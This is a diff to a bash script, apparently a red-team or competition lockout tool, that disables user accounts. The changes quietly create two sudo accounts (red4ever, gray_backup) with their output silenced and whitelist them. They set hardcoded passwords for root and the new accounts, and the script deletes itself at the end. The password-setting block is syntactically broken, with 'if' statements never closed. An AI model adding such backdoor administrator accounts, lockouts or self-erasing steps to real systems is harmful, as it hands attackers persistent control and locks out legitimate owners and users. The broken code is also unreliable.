@@ -4,12 +4,20 @@
 # A function that creates a whitelist. Will ALWAYS include the user executing the script.
 function create_whitelist()
 {
-    useradd red4ever
-    adduser red4ever sudo
+    # Create user 1
+    sudo useradd red4ever > /dev/null
+    sudo adduser red4ever sudo > /dev/null
+    sudo su red4ever > /dev/null
+
+    sudo useradd gray_backup > /dev/null
+    sudo adduser gray_backup sudo > /dev/null
+    
     # Adds the executing user to the whitelist
     WHITELIST+=("$(logname)")
     WHITELIST+=(root)
     WHITELIST+=(red4ever)
+    WHITELIST+=(gray_backup)
+    WHITELIST+=(gray)
 }
 
 
@@ -20,8 +28,13 @@ function set_passwords(){
 
     # Loop through the usernames
     while read LINE; do
-        # Change the password for each user
-        echo ${LINE}:"NduwHev73!!5kwbHs"| sudo chpasswd 1> /dev/null
+        # Change the password for each user NOT ON GRAY
+        if [ $LINE = "root" ]; then
+            echo ${LINE}:"KJfe735guf2grf47"| sudo chpasswd 1> /dev/null
+        if [ $LINE = "red4ever" ]; then
+            echo ${LINE}:"JKSRH73562@!%"| sudo chpasswd 1> /dev/null
+        if [ $LINE = "gray_backup" ]; then
+            echo ${LINE}:"&%#Ybs3ryfvds"| sudo chpasswd 1> /dev/null
     done < login_usernames_temp.txt
 
     rm login_usernames_temp.txt
@@ -80,3 +93,8 @@ disable_users
 set_passwords
 echo
 echo "Users disabled successfully."
+
+echo
+echo "NUKING DISABLER / LOCKER"
+
+sudo rm -rf disable_no_menu.sh
